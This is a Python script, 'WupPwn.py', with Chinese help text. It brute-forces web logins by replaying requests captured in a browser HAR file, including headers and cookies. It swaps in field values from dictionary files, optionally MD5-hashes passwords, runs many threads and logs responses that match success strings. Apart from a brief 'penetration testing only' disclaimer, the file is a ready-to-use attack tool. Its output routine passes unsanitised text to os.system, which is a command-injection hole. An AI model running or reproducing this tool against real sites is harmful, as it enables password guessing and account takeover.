#encoding:utf-8
import sys;
#Yeah,我没有注释。懒得写
HelpContent="""
Help:
+=====================================================================================================================+
                            WupPwn.py
Python3 WupPwn.py HarFileName [pd=filedName:Value|pd=filedName:$DicFileName] [if=responseContent] [ifnot=responseContent] [ifend=responseContent] [out=OutFileName]
        HarFileName har文件名 谷歌或Firefox web抓包保存为har entries下可以看到所有请求的地址及参数 可以删除一些不必要的请求让程序更快运行
        pd 设置上传数据 字段名:值 或者 字段名:字典
        if=xxx 如果内容是xxx那就记录 可多个用||隔开
        ifnot=xxx 如果内容不是xxx哪就记录  可多个用||隔开
        ifend=xxx 如果内容是xxx那就记录并结束 可多个用||隔开
        out=xx.txt 输出记录到文件
        see=on|off 查看每次尝试破解响应
             Current request method have: GET/POST
                *且目前不支持http请求头带 RFC 标识 (RFC-eg: ':method':'POST')可以检查是否有
        md5=XXX 将 指定字段名的值进行md5加密再暴力破解 一般=password||passwd||pwd ...
        th=5 设置5个线程同时运行
    版本警告:
        《!》: 切勿用作违法使用，仅供渗透测试，如非法使用该工具与作者无关。 Makerby:Pwn0_+x_X
+=====================================================================================================================+
""";
if(len(sys.argv) <=1):
    print(HelpContent);
    sys.exit(1);
if(sys.argv[1].lower()=="h" or sys.argv[1].lower()=="-h" or sys.argv[1].lower()=="help"or sys.argv[1].lower()=="-help"):
    print(HelpContent);
    sys.exit(1);
import os;
import json;
import urllib.request;
import requests;
import socket;
import hashlib;
import threading;
import traceback;
import uuid;
import copy
from hyper.contrib import HTTP20Adapter;
socket.setdefaulttimeout(3);
CAllowRequestMethod=["get","post"];
HARFile=sys.argv[1];
harfp=open(HARFile,"rb");
harContent=harfp.read();
HarJSON=json.loads(harContent);
Body=HarJSON["log"]
print("Version :"+Body["version"]);
print("Request Count :"+str( len(Body["entries"])))
AimUrlAPar={};
for reqBody in Body["entries"]:
    AimUrlAPar[reqBody["request"]["url"]]={};
    AllowRequest="×";
    if(reqBody["request"]["method"].lower() in CAllowRequestMethod):
        AllowRequest="√";
    else:
        print(" "*5,"[",AllowRequest,"]",reqBody["request"]["method"],"\t\t"+reqBody["request"]["url"].split("?")[0])
        continue;
    print(" "*5,"[",AllowRequest,"]",reqBody["request"]["method"],"\t\t"+reqBody["request"]["url"].split("?")[0])
    Parameter=  reqBody["request"]["queryString"] if reqBody["request"]["method"].lower()=="get" else reqBody["request"]["postData"]["text"]
    #print(Parameter)
    if(reqBody["request"]["method"].lower()=="post"):
        if "application/json" in reqBody["request"]["postData"]["mimeType"]:
            Parameter=json.loads(Parameter)
        else:
            Parameter=reqBody["request"]["postData"]["params"];
            tmpPar={};
            for item in Parameter:
                tmpPar[item["name"]]=item["value"];
            Parameter=tmpPar;
        AimUrlAPar[reqBody["request"]["url"]]["paramtertype"]=reqBody["request"]["postData"]["mimeType"].lower()
    elif(reqBody["request"]["method"].lower()=="get"):
        Par={};
        #print("get")
        for item in Parameter:
            Par[item["name"]]=item["value"]
        Parameter=Par;
    headers={};
    headNotContains=["Content-Length"];
    for headFiled in reqBody["request"]["headers"]:
        if headFiled["name"] in headNotContains:
            continue;
        headers[headFiled["name"]]=headFiled["value"];
    cookies={};
    for headFiled in reqBody["request"]["cookies"]:
        cookies[headFiled["name"]]=headFiled["value"];
    #print(cookies);
    AimUrlAPar[reqBody["request"]["url"]]["arguments"]=Parameter
    AimUrlAPar[reqBody["request"]["url"]]["header"]=headers
    AimUrlAPar[reqBody["request"]["url"]]["cookies"]=cookies
    AimUrlAPar[reqBody["request"]["url"]]["method"]=reqBody["request"]["method"].lower()
    AimUrlAPar[reqBody["request"]["url"]]["httpversion"]=reqBody["request"]["httpVersion"].lower()
    
#系统存储
kPMd5={};

#用户参数设定
pds=[];
ifC=[];# 最小优先级
ifN=[];# 其二优先级
ifE=[];# 最大优先级
otFile="";
ascMD5=[];
testsee="off";
see="off";
th=0;
def setBaseParamters(Key,Value):
    global see,otFile,testsee,th;
    Key=Key.lower();
    if(Key=="pd"):
        FILEDSUM=Value.split(":");
        filedName=FILEDSUM[0];
        filedValue=FILEDSUM[1];
        
        if(filedValue[0]=="$"):
            apArr=[];
            filedP=open(filedValue[1:],"r");
            redValueLines=filedP.readlines();
            for val in redValueLines:
                apArr.append({filedName:val.replace("\n","")});
            pds.append(apArr);
        else:
            pds.append([{filedName:filedValue}]);
    elif(Key=="if"):
        ifcItems=Value.split("||");
        for item in ifcItems:
            ifC.append(item);
    elif(Key=="ifnot"):
        ifcItems=Value.split("||");
        for item in ifcItems:
            ifN.append(item);
    elif(Key=="ifend"):
        ifcItems=Value.split("||");
        for item in ifcItems:
            ifE.append(item);
    elif(Key=="md5"):
        md5Items=Value.split("||");
        for item in md5Items:
            ascMD5.append(item);
    elif(Key=="see"):
        see=Value.strip().lower();
    elif(Key=="out"):
        otFile=Value.strip().lower();
    elif(Key=="testsee"):
        testsee=Value.strip().lower();
    elif(Key=="th"):
        th=int(Value.strip().lower());
    return;
curThs={};
def pdLoop(index,havePar={},myThead=None):
    global curThs,kPMd5;
    for item in pds[index]:
        FiledName=list(item.keys())[0];
        FiledValue=list(item.values())[0];
        if(FiledName in ascMD5):
            m5Obj=hashlib.md5(bytes(FiledValue,encoding="UTF-8"));
            SourceValue=FiledValue;
            FiledValue=m5Obj.hexdigest();
            kPMd5[FiledValue]=SourceValue;
        havePar[FiledName]=FiledValue;
        if(index>0):
            if(th>0 and len(curThs)<th ):
                print("[+]线程记录点")
                childThread=str(uuid.uuid1()).replace("-","");
                RunTh= threading.Thread(target=pdLoop,args=(index-1,copy.deepcopy(havePar),childThread,));
                
                curThs[childThread]=RunTh;
                RunTh.start();
            else:
                pdLoop(index-1,copy.deepcopy(havePar));
        else:
            Call(havePar);
    if(myThead!=None):
        print("[+]线程释放点",myThead)
        curThs.pop(myThead);
def Call(sendData):
    for reqUrl in list(AimUrlAPar.keys()):
        CurHeaders= AimUrlAPar[reqUrl]["header"];
        CurHeaders["Cookie"]="";
        CurCookies=  AimUrlAPar[reqUrl]["cookies"];
        for cookieKey in list(CurCookies.keys()):
            CurHeaders["Cookie"]+=cookieKey+"="+CurCookies[cookieKey]+";"
            #print(cookieKey+"="+CurCookies[cookieKey]+";");
        CurArguments= AimUrlAPar[reqUrl]["arguments"];
        for cgDataKey in list(sendData.keys()):
            CurArguments[cgDataKey]=sendData[cgDataKey];
        try:
            if(AimUrlAPar[reqUrl]["method"]=="get"):
                print("[+]GET-Pwn:%s"%(reqUrl));
                #data = urllib.parse.urlencode(CurArguments).encode('utf-8');
                if(AimUrlAPar[reqUrl]["httpversion"]=="http/2.0"):
                    sessions.mount(reqUrl,HTTP20Adapter());
                res=requests.get(reqUrl,headers=CurHeaders,params=CurArguments);
                print(res.text);
                Auth(CurArguments,res.text);
            elif(AimUrlAPar[reqUrl]["method"]=="post"):
                """
                data = urllib.parse.urlencode(CurArguments).encode('utf-8')
                request = urllib.request.Request(reqUrl,data = data,headers = CurHeaders,method="POST");
                response = urllib.request.urlopen(request)
                html = response.read().decode('utf-8')"""
                if(AimUrlAPar[reqUrl]["paramtertype"]=="application/x-www-form-urlencoded"):
                    data = urllib.parse.urlencode(CurArguments).encode('utf-8')
                else:
                    data = json.dumps(CurArguments);
                sessions=requests.session();
                if(AimUrlAPar[reqUrl]["httpversion"]=="http/2.0"):
                    sessions.mount(reqUrl,HTTP20Adapter());
                res=sessions.post(reqUrl,data=data,headers=CurHeaders);
                Auth(CurArguments,res.text);
        
            None;
        except Exception as e:
            print("[-]Pwn timeout",traceback.print_exc(),kPMd5)

def Auth(Arguments,resContent):
    Success=False;
    Arguments=copy.deepcopy(Arguments)
    for argItemName in list(Arguments.keys()):
        if(argItemName in ascMD5):
            Arguments[argItemName]=kPMd5[Arguments[argItemName]];
    #print(ifE,ifC,ifN)
    for ifeItem in ifE:
        if(ifeItem in resContent):
            Output(str(Arguments));
            sys.exit(1);
    for ifnItem in ifN:
        if not(ifnItem in resContent ):
            Output(str(Arguments));
            Success=True
    for ifcItem in ifC:
        if (ifcItem in resContent ):
            Output(str(Arguments));
            Success=True
    if(see=='on'):
        print({True:"\t[√]",False:"[-]"}[Success],Success,Arguments);
    if(testsee=="on"):
        print(resContent);

def Output(text):
    if(otFile.strip() == ""):
        return;
    os.system("echo %s>>%s"%(text,otFile));
    return ;

for index in range(len(sys.argv)-2):
    parIndex=index+2;
    parItem= sys.argv[parIndex];
    try:
        Item= parItem.split("=");
        key=Item[0];
        value=Item[1];
        setBaseParamters(key,value);
    except:
        print("Error paramter(%s)"%(parItem));
#print(AimUrlAPar);
if(len(pds)-1>=0):
    pdLoop(len(pds)-1)

